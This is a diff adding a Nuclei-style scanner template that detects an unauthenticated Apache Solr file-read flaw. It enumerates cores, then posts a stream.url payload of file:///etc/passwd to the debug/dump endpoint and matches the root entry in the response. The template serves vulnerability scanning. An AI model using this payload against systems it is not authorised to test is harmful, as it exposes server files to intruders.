@@ -1,0 +1,43 @@
+id: solrbear
+
+info:
+  name: Apache Solr file information disclosure
+  author: z3bd
+  severity: low
+  reference: https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
+  description: An unauthenticated user can read the filesystem as the solr user
+  tags: solr,leak
+
+requests:
+  - raw:
+      - |
+        GET /solr/admin/cores HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+      - |
+        POST /solr/{{core}}/debug/dump?param=ContentStreams HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=------------------------deadbeefdeadbeef
+        Connection: close
+        --------------------------deadbeefdeadbeef
+        Content-Disposition: form-data; name="stream.url"
+        file:///etc/passwd
+        --------------------------deadbeefdeadbeef--
+
+    extractors:
+      - type: regex
+        name: core
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '("name":")([^"]*)'
+          
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+        condition: and
+        part: body
